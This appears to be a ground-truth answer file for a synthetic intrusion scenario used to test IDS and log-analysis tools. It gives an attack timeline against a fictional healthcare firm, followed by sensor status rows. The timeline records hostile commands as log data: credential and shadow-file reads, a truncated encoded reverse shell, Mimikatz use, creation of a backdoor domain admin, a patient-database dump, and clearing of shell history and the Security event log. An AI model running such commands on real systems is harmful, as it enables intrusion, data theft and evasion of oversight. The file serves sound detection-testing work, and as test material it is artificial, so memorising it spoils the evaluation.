# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:49 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:10 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CYkLBixRliFA1jM7a2) |
| 2024-03-18 12:24:12 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:29:59 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:29:59 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:41 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (445 requests) |
| 2024-03-18 12:44:59 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:17 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:13 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CL39ufA8SMxfFSJH5OG) |
| 2024-03-18 13:00:07 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CZc8GjQ2K9KiaHg5XU) |
| 2024-03-18 13:00:08 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CxaFjvKHgvq8j5RXz) |
| 2024-03-18 13:20:06 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CLSNKHFiKXFeUExGClF) |
| 2024-03-18 13:20:08 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581441) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:10 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CZZ8D25HqypySDtNQG) |
| 2024-03-18 13:20:12 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:39 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584304) - `ip addr show` |
| 2024-03-18 13:39:53 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584334) - `cat /etc/hosts` |
| 2024-03-18 13:40:05 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584539) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:30 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 585224) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:46:32 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 586485) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:50:27 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:18 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 586656) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:56:08 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:51 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587122) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:53 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587419) - `ls -la /root/.ssh` |
| 2024-03-18 14:02:42 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587703) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:14 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: Co7L6jbqq6DJylljw6) |
| 2024-03-18 14:15:15 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CQQSjn5M4pUmPbSRsk) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:44 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962116) - `cat /etc/passwd` |
| 2024-03-18 14:34:47 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962136) - `cat /etc/shadow` |
| 2024-03-18 14:50:22 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:11 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:03 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:04 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: C9TAY8KzLu08weuXTy) |
| 2024-03-18 15:08:12 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:52 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: CgytXCKrENNNoUTq3W) |
| 2024-03-18 15:20:21 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27014b3) |
| 2024-03-18 15:20:22 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6852) - `whoami /all` |
| 2024-03-18 15:20:24 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6868) - `net user /domain` |
| 2024-03-18 15:20:31 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6872) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:32 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6912) - `net view /domain` |
| 2024-03-18 15:20:33 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:35 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: C27WSABXzfCfv8RTQMG) |
| 2024-03-18 15:44:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6920) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:44:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:52 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x55534af) |
| 2024-03-18 15:59:54 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5628) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:54 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:57 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5632) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:29 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:41 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5640) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:43 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:45 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5656) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:46 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:37 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5668) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:38 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:40 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5704) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:41 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:30:26 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:30:48 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:53 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 233 queries, 1142 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=230 emitted=6 filtered=224] |
| 2024-03-18 16:49:45 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:42 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=180 emitted=18 filtered=162] |
| 2024-03-18 17:01:26 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885d8a) |
| 2024-03-18 17:01:27 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6132) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:29 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6168) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:15:11 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: Cfy6pTZK6Dwku9aVUgv) |
| 2024-03-18 17:15:12 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158383) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:16:38 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 159454) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:45 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:22:55 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159863) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:25:23 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: C05nSxvfrt0u0rdQ4l) |
| 2024-03-18 17:29:50 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:00 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:07 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608793) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:22 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982900) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:11 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6140) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:13 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6156) - `wevtutil cl Security` |
| 2024-03-18 17:42:15 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:06 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:08 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:10 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:49:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6200) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:49:50 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:55:28 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:21 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:28 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 009b385b-b361-483f-b2f3-ca1f11977355 | ids | delayed: 1 |
| 019bfd41-0448-4fdd-bff2-f6f60d7edeac | ids | delayed: 1 |
| 02a0fd04-7b38-4274-9933-7f9bd4288878 | ids | visible: 1 |
| 02d219c8-30c2-4ab2-a2b4-7cc4281c3dae | ids | delayed: 1 |
| 05088a97-acf9-451e-80b1-50bbe34a2ed8 | ids | delayed: 1 |
| 07100ca1-b428-4921-92ca-6c833fe75407 | ids | delayed: 1 |
| 0802ed00-aedc-4602-83df-6abb7b9fb69a | ids | delayed: 1 |
| 097b367b-575e-4812-8160-db4a44d6aa2f | ids | delayed: 1 |
| 098d2792-5e39-45cb-ad0a-288f7eea8606 | ids | delayed: 1 |
| 1085aab1-cb01-47c7-b7e1-e02ff0a8ecbd | ids | delayed: 2 |
| 1111ca59-42b7-428b-8d8b-5526cbff8f62 | ids | delayed: 2 |
| 1131d6a7-220a-47cf-ac8a-620b9329d2c5 | ids | delayed: 2 |
| 1635a39e-33e1-4c77-92e7-4a2357b3a264 | ids | delayed: 1 |
| 18b0443b-620e-4c92-8f39-ec5c9dc686ff | ids | delayed: 1 |
| 19883ee5-a069-4d82-9c2b-2a13bbce7ac1 | ids | delayed: 1 |
| 1c551de2-b8d9-42a7-a428-8a94d985b97f | ids | delayed: 1 |
| 1e9c3ade-f6f6-4cc7-920d-5ff83fc1ec3d | ids | delayed: 1 |
| 20fe36c3-baba-416b-956d-df3b71321b18 | ids | delayed: 1 |
| 211571b5-4f91-45db-8ba9-ee67955f124f | ids | delayed: 2 |
| 227c4f59-8221-45f7-84f7-cc6eb368efae | ids | delayed: 1 |
| 24d5616b-3e98-475e-a7a4-93a3032ed185 | ids | delayed: 1 |
| 2872a3d3-83c3-4cf5-9b7c-fedc376e2c06 | ids | delayed: 1 |
| 2ba43ab6-9fa9-4121-9dbc-4a0bcba93594 | ids | delayed: 1 |
| 2bc9ad00-9545-4ad4-a48f-21a59a17e829 | ids | delayed: 1 |
| 3364bce2-da6e-4330-bca6-dae4cd35314d | ids | delayed: 1 |
| 36c43d7a-3303-4bce-9583-1ea6268aaf22 | ids | delayed: 1 |
| 370a58d1-c17d-4e53-bf69-65b20044e146 | ids | delayed: 1 |
| 37da6781-4dac-4949-9106-627830bd093f | ids | delayed: 1 |
| 39476869-c56a-4c08-9496-437d7e8b67cf | ids | delayed: 1 |
| 3ba61dec-4773-486e-a1ac-aa9c911cece4 | ids | delayed: 1 |
| 3e8fb61c-7dde-4c55-a2ce-4e152847fb65 | ids | delayed: 1 |
| 3f3e057e-9ac7-476b-8872-7c3e11aed73a | ids | delayed: 1 |
| 430cedb6-c574-4741-a884-78ab78dcfd5e | ids | delayed: 1 |
| 49864583-baea-4b20-bba2-cb6f19146176 | ids | delayed: 1 |
| 4aa615d8-1547-4304-a80c-b1792497d7dd | ids | delayed: 1 |
| 4ad088f6-a38f-4893-9fae-5e583175d11d | ids | delayed: 1 |
| 4b22ba16-d5e7-425d-aa4e-6225b30b9865 | ids | delayed: 2 |
| 4f93f334-ebd1-403a-ae69-7c8f39f3923a | ids | delayed: 1 |
| 561016e9-1217-42ea-9862-187327879d60 | ids | delayed: 2 |
| 57e5da67-3c0b-4909-a8f9-1b816142ed63 | ids | delayed: 1 |
| 5838779a-1dbd-4ba5-9862-d6a733eed12d | ids | delayed: 1 |
| 5abbf7d4-c4dd-4535-94d4-ce97b05087f2 | ids | delayed: 2 |
| 5badd4e7-5c3e-4de1-8e95-ff14af76f3b1 | ids | delayed: 1 |
| 5d456fa1-089d-43dd-b45e-6a0b89c71804 | ids | delayed: 2 |
| 5e0da90f-f817-41bb-ae6a-ac65985be898 | ids | delayed: 1 |
| 62847ad2-0af8-4483-8fc4-de39ec5833d0 | ids | delayed: 1 |
| 6454b60f-bd90-4c96-8ab7-840968eb4c4c | ids | delayed: 2 |
| 6455b357-5f68-46ff-b0ac-6ff7f083b42c | ids | delayed: 1 |
| 659f03ef-6d39-4cfe-ae61-6b486c36fa7d | ids | delayed: 1 |
| 65b3879c-bced-406f-a2d1-72da8b580bc5 | ids | delayed: 1 |
| 669cfba7-63a4-498e-b1aa-a94fb49ddb05 | ids | delayed: 1 |
| 67f4f472-5d9b-423b-999f-aaadd3715b0a | ids | delayed: 1 |
| 68984bf5-a339-4304-9f22-746820e38356 | ids | delayed: 1 |
| 6b3a366b-2d62-4b22-9717-1a983d721f22 | ids | delayed: 1 |
| 6ccbc7bf-6445-4f65-b0e4-6de02ffd0681 | ids | delayed: 1 |
| 6ccf3619-83d0-4651-a0fe-008fc81e35af | ids | delayed: 1 |
| 726cf0d4-078d-4f14-85e0-f07dd94ece7e | ids | delayed: 1 |
| 72ab0bc7-8064-4d29-9639-8cb5eb56b1ef | ids | delayed: 1 |
| 7641a2f9-5e68-479a-b0e9-844b0055f4e9 | ids | delayed: 1 |
| 775a8ca5-b245-4504-9d6f-134d4264bfff | ids | delayed: 1 |
| 7796e48e-05d2-413a-bacd-79289708cdb6 | ids | delayed: 1 |
| 7803de7c-af52-41dc-b973-5e9c9c4288ca | ids | delayed: 1 |
| 7917a998-1004-4cf5-9fff-28a2cd246ecb | ids | delayed: 1 |
| 81e5583e-c710-457f-9ff8-eb1c3513f955 | ids | delayed: 1 |
| 8284620e-dfb3-4558-90bd-018944a11339 | ids | delayed: 1 |
| 85feca5c-94f6-4777-8dfe-f51b995f52a4 | ids | delayed: 1 |
| 8775a0f4-bce5-474c-ae25-746d3174b42a | ids | delayed: 1 |
| 8e70c6ee-40ea-4724-a75a-1fe074edb319 | ids | delayed: 1 |
| 8fb82982-96a5-44ed-bf1c-a8e0095963f6 | ids | delayed: 1 |
| 9045c958-7304-44e8-98b6-783457f42938 | ids | delayed: 2 |
| 91e3862e-cb80-4953-85e7-796d256e0568 | ids | delayed: 1 |
| 958389ca-72bd-494f-80ad-a867116cae54 | ids | delayed: 1 |
| 99878e7e-c07e-4ed2-84a9-263321c71626 | ids | delayed: 2 |
| 9af71f7a-1d0f-4420-b6b1-e171b83b7808 | ids | delayed: 1 |
| 9db20ab6-4de7-462d-b9f0-63203af93934 | ids | delayed: 1 |
| 9df422fd-f1df-47b7-8fb1-f7871a74793b | ids | delayed: 1 |
| 9e3f1feb-0fe9-4afc-9b62-d8018e4e0e94 | ids | delayed: 1 |
| 9e46fe59-79d0-44ef-a9a4-17a0402c23ce | ids | delayed: 1 |
| 9e8445f5-0299-4f10-9858-937208b420d7 | ids | delayed: 1 |
| 9edc4c2c-9bdb-4926-ad73-eba18e445a6c | ids | delayed: 1 |
| 9fd974a2-9482-40e6-bfa3-0c521d39e6c6 | ids | delayed: 1 |
| a106494c-17cb-4143-b37f-aaca83a6b513 | ids | delayed: 1 |
| a3febe31-464c-411b-9fcb-c4241c99bb05 | ids | delayed: 1 |
| a4733e1a-83b7-48ab-9d10-e2648962ed64 | ids | delayed: 1 |
| a4a65889-e345-43f1-91de-4640f215bf60 | ids | delayed: 1 |
| a6653588-050e-49eb-b038-f5f00c97bc99 | ids | delayed: 1 |
| ae1c06a0-fcba-4229-b09d-187a1dcd5679 | ids | delayed: 1 |
| ae8ad128-aafd-44b2-86a2-d5091db4cb0b | ids | delayed: 1 |
| aedd4f72-f053-4053-9b58-dd8798d3c614 | ids | delayed: 1 |
| b04a66c7-9cd3-4116-a4f4-b1f9893882b7 | ids | delayed: 1 |
| b3834896-3ab1-4b98-a878-1aa7630d3196 | ids | delayed: 1 |
| b576dc15-0647-4132-b7ef-0d0795d87e0c | ids | delayed: 1 |
| ba3e1964-232d-40dc-9a8f-3dd8572f1e5b | ids | delayed: 1 |
| baebf3e0-2c36-4646-9ee3-607bd6ffc5c3 | ids | delayed: 1 |
| bf352115-9d10-4d73-8dcb-c2ddfa7198d3 | ids | delayed: 2 |
| c0fb2456-0e26-4587-9f9a-15dceccaf22f | ids | delayed: 1 |
| c330d6cd-6e8e-47fc-9325-fb2376e7d2b0 | ids | delayed: 2 |
| c3cf5ef2-5da2-46fa-8049-12d44a3b02cb | ids | delayed: 1 |
| c4755b1e-defe-4c8a-9c70-cc5296b151ac | ids | delayed: 2 |
| c4dc6fa1-7dd4-4234-9ded-d63fbfc1071b | ids | delayed: 1 |
| c4e49b56-06e4-437a-9926-b3564543229a | ids | delayed: 1 |
| c717b896-a215-4555-98b7-c0aa5f1a1e7c | ids | delayed: 2 |
| c8d0a3e8-f9a9-4613-9333-fb5a2a533b46 | ids | delayed: 1 |
| ccd63840-e0c5-4d16-acc2-a4e47142c3fe | ids | delayed: 1 |
| cdeef9e4-4d31-4ae9-8247-d8e6ebf8cff7 | ids | delayed: 1 |
| cf3a8109-f7fc-4d18-a5e7-600a75d18221 | ids | visible: 1 |
| cf9cc608-3566-47e1-85de-0c2560ed2bb1 | ids | delayed: 1 |
| d043aa70-33fb-4a50-9308-65133da9b880 | ids | delayed: 1 |
